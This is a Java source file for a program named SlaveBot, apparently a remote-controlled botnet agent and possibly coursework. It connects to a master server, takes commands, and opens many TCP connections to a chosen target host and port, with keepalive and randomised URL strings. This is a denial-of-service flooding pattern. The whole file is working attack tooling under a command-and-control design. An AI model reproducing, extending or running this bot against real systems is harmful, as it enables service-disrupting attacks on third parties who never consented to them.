import java.io.*;
import java.net.*;
import java.util.*;

public class SlaveBot{

	public static void main(String args[]) throws IOException{

		if(args.length == 4 &&
				args[0].equals("-h") &&
				args[2].equals("-p") && 
				Integer.parseInt(args[3]) > 0 && Integer.parseInt(args[3]) < 65536){

			String masterIPOrHostName = args[1];
			int masterPort = Integer.parseInt(args[3]);
			Socket socket = new Socket(masterIPOrHostName, masterPort);
			//System.out.println("Checking - Connected!!");
			BufferedReader bfrFromMaster = new BufferedReader(new InputStreamReader(socket.getInputStream()));

			while(true){
				String cmdFromMaster = bfrFromMaster.readLine();
				SlaveThread salveThread = new SlaveThread(socket, cmdFromMaster);
				salveThread.start();
			}
		}
		else{

			System.out.println("Usage: SlaveBot -h IPAddress|Hostname -p PortNumber");
		}
	}
}

class connectedSlaveList {
	public static List<Socket> socketList = Collections.synchronizedList(new LinkedList<>());
	public static List<String> ipOrHostList = Collections.synchronizedList(new LinkedList<>());
	public static List<Integer> portList = Collections.synchronizedList(new LinkedList<>());
	connectedSlaveList() {}
}

class SlaveThread extends Thread{

	private Socket slaveSocket;
	private String cmdFromMaster;
	private String[] cmd;
	private String targetIPorHost;
	private int targetPort;
	private int numConnection;

	SlaveThread(Socket socket, String cmdFromMaster){
		this.cmdFromMaster = cmdFromMaster;
		slaveSocket = socket;
	}

	public void run(){
		cmd = cmdFromMaster.split(" ");
		switch (cmd[0]) {
		case "connect":
			connect(cmd);
			break;
		case "disconnect":
			disconnect(cmd);
			break;
		case "Exit":
			exit(cmd);
			break;
		default:
			break;
		}

	}

	public void connect(String[] cmd) {
		targetIPorHost = cmd[1];
		targetPort = Integer.parseInt(cmd[2]);
		numConnection = Integer.parseInt(cmd[3]);
		for(int i = 0; i < numConnection; i++){
			synchronized(connectedSlaveList.socketList){
				try{
					Socket socket = new Socket(targetIPorHost, targetPort);
					connectedSlaveList.socketList.add(socket);
					System.out.println("Connected to target: " + targetIPorHost + ", target port number: " + targetPort);
					if(cmdFromMaster.contains("keepalive")){
						socket.setKeepAlive(true);
						if(socket.getKeepAlive() == true){
							System.out.println("KeepAlive Successfull!!");
						}
					}
					else if(cmdFromMaster.contains("url=")){
						// generate random string

						String randomString = new RandomString((new Random()).nextInt(10)+1).nextString();
						String urlString = "";
						if(targetIPorHost.startsWith("http://") && cmdFromMaster.contains("/#q=")){
							urlString = targetIPorHost + "/" + cmd[4].substring(4) + randomString;
						}
						else if(cmdFromMaster.contains("/#q=")){
							urlString = "http://" + targetIPorHost + cmd[4].substring(4) + randomString;
						}
						else if(cmd[4].substring(4).startsWith("/")){
							urlString = "http://" + targetIPorHost + cmd[4].substring(4) + "/#q=" + randomString;
						}
						else if(cmdFromMaster.contains("/") == false){
							urlString = "http://" + targetIPorHost + "/" + cmd[4].substring(4) + "/#q=" + randomString;
						}
						System.out.println(urlString);
					}

				}catch (UnknownHostException e){
					//System.err.println("No route to host.");
					System.exit(-1);
				}catch (IOException e){
					e.printStackTrace();
					System.exit(-1);					
				}
			}
			synchronized(connectedSlaveList.ipOrHostList){
				connectedSlaveList.ipOrHostList.add(targetIPorHost);
			}
			synchronized(connectedSlaveList.portList){
				connectedSlaveList.portList.add(targetPort);
			}
		}
	}
	public void disconnect(String[] cmd) {
		boolean isDisconnected = false;
		targetIPorHost = cmd[1];
		if(cmd[2].equals("all")){
			for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
				if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost)){
					isDisconnected = true;
					synchronized(connectedSlaveList.socketList){
						try{
							connectedSlaveList.socketList.get(i).close();
							connectedSlaveList.socketList.remove(i);
							System.out.println("disconnect " + targetIPorHost);
						}catch (IOException e){
							e.printStackTrace();
							System.exit(-1);
						}
					}
					synchronized(connectedSlaveList.ipOrHostList){
						connectedSlaveList.ipOrHostList.remove(i);
					}
					synchronized(connectedSlaveList.portList){
						connectedSlaveList.portList.remove(i);
					}
				}
				i--;
			}
		}
		else{

			targetPort = Integer.parseInt(cmd[2]);
			for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
				if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost) && 
						connectedSlaveList.portList.get(i).equals(targetPort)){
					isDisconnected = true;
					synchronized(connectedSlaveList.socketList){
						try{
							connectedSlaveList.socketList.get(i).close();
							connectedSlaveList.socketList.remove(i);

						}catch (IOException e){
							e.printStackTrace();
							System.exit(-1);
						}
					}
					synchronized(connectedSlaveList.ipOrHostList){
						connectedSlaveList.ipOrHostList.remove(i);
					}
					synchronized(connectedSlaveList.portList){
						connectedSlaveList.portList.remove(i);
					}
				}
				i--;

			}
		}
		if(isDisconnected == false){
			//System.out.println(targetIPorHost + " is already disconnected!");
		}

	}
	public void exit(String[] cmd) {
		System.out.println("Closing Connections");
		System.exit(-1);
	}

}
class RandomString {
	private static final char[] symbols;
	static{
		StringBuilder tmp = new StringBuilder();
		for(char ch = '0'; ch <= '9'; ++ch)
			tmp.append(ch);
		for(char ch = 'a'; ch <= 'z'; ++ch)
			tmp.append(ch);
		symbols = tmp.toString().toCharArray();
	}
	private final Random random = new Random();
	private final char[] buf;
	public RandomString(int length){
		if (length < 1)
			throw new IllegalArgumentException("length < 1: " + length);
		buf = new char[length];
	}
	public String nextString() {
		for (int idx = 0; idx < buf.length; ++idx)
			buf[idx] = symbols[random.nextInt(symbols.length)];
		return new String(buf);
	}

}